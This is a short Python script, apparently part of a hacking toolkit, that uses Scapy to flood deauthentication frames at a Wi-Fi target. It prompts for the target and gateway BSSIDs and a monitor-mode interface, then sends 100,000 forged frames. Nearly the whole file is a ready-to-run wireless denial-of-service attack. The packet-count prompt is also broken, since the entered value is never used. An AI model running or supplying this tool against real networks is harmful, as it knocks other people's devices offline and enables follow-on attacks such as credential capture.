from scapy.all import *
from os import system
from os import name as OSname
from colorama import Fore as color
def  DeauthenticationAttacksMainF():
    while 1:
        try:
            system("clear")
            print(r"""
             (\-"````"-/)
             //^\    /^\\
            ;/ ~_\  /_~ \;
            |  / \\// \  |
           (,  \0/  \0/  ,)
            |   /    \   |
            | (_\.__./_) |
             \ \v-..-v/ /
              \ `====' /
               `\\\///'
                '\\//'
                  \/
            """)
            target_mac = input("\nEnter the target BSSID : ")
            gateway_mac = input("\nEnter the gateway BSSID : ")
            ifc=input("\nEnter the interface (Must be in monitoring mode) : ")
            while 1:
                try :
                    count=int(input("\nEnter the number of packages (default = infinite) : "))
                    break
                except ValueError:
                    print(f"{color.RED}\n\n ValueError! \n\n")

            if not count:
                count=100000
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            sendp(packet, inter=0.1, count=100000, iface=ifc, verbose=1)
        except KeyboardInterrupt:
            break
